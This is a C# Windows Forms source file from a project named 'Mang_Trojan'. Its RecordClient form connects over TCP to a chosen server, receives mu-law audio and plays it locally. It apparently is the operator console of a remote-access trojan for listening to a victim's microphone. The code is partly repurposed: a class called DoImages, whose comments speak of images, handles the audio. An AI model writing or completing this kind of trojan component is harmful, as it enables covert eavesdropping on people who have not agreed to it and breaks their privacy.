using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using WinSound;
namespace Mang_Trojan.form
{
    public partial class RecordClient : Form
    {
        DoImages doImages;
        public RecordClient()
        {
            InitializeComponent();
        }


        private void RecordClient_Load(object sender, EventArgs e)
        {
            LoadWaveDevices();
        }

        #region method LoadWaveDevices

        /// <summary>
        /// Loads available wave input and output devices to UI.
        /// </summary>
        private void LoadWaveDevices()
        {

            // Load output devices.
            m_pOutDevices.Items.Clear();
            foreach (LumiSoft.Media.Wave.WavOutDevice device in LumiSoft.Media.Wave.WaveOut.Devices)
            {
                m_pOutDevices.Items.Add(device.Name);
            }
            if (m_pOutDevices.Items.Count > 0)
            {
                m_pOutDevices.SelectedIndex = 0;
            }
        }

        #endregion



        private void btnPress_Click(object sender, EventArgs e)
        {

            // If the button says 'Start'
            if ((string)btnPress.Tag == "1")
            {
                // Create a new thread to receive the images
                try
                {
                    
                  
                  
                    doImages = new DoImages(this, Convert.ToInt32(txtPort.Text));
                    ThreadStart o = new ThreadStart(doImages.ThreadProc);
                    Thread thread = new Thread(o);
                    
                    thread.Start();
                }
                catch (Exception ex)
                {
                   
                    return;
                }

                // Reset the button tag and description
                btnPress.Tag = "2";
                btnPress.Text = "Dừng";
            }
            else
            {
                Stop();
               
               
            }
        }

        private void Stop()
        {
            // Inform the thread it should stop
            doImages.Done = true;
            doImages = null;

            // Reset the button tag and description
            btnPress.Tag = "1";
            btnPress.Text = "Bắt đầu";
        }

       
        // ================================================================================================
        public class DoImages
        {
            WinSound.Player m_Player;

            // Abort indicator
            public bool Done;

            // Form to write to
            private RecordClient m_f;

            // Client connection to server
            private TcpClient tcpClient;

            // stream to read from
            private NetworkStream networkStream;

            const int SAMPLE_PER_SECONDS = 11025;
            const int BIT_PER_SAMPLE = 16;
            const int CHANNEL = 1;
            const int BUFFER_COUNT = 8;
            const int BUFFER_SIZE = 1024;

            public DoImages(RecordClient f, int nPort)
            {
                Done = false;
                m_f = f;

                //WinSoundServer
                m_Player = new WinSound.Player();

                // Connect to the server and get the stream
                tcpClient = new TcpClient(m_f.txtServer.Text, nPort);
                tcpClient.NoDelay = false;
                tcpClient.ReceiveTimeout = 5000;
                tcpClient.ReceiveBufferSize = 20000;
                networkStream = tcpClient.GetStream();
            }

            public void ThreadProc()
            {
                

                do
                {
                    m_Player.Open((string)m_f.m_pOutDevices.SelectedItem, SAMPLE_PER_SECONDS, BIT_PER_SAMPLE, CHANNEL, BUFFER_COUNT);

                   byte[] message = new byte[BUFFER_SIZE];
                   int bytesRead;

                  
                       bytesRead = 0;

                       try
                       {
                           //blocks until a client sends a message
                           bytesRead = networkStream.Read(message, 0, BUFFER_SIZE);
                          
                       }
                       catch
                       {
                           //a socket error has occured
                           break;
                       }

                       if (bytesRead == 0)
                       {
                           //the client has disconnected from the server
                           break;
                       }

                       Byte[] linearBytes = WinSound.Utils.MuLawToLinear(message, BIT_PER_SAMPLE, CHANNEL);
                       //Abspielen
                       m_Player.PlayData(linearBytes, false);

                   
                } while (!Done);

                networkStream.Close();
                tcpClient.Close();
                networkStream = null;
                tcpClient = null;
                }
                }
        


    }
}
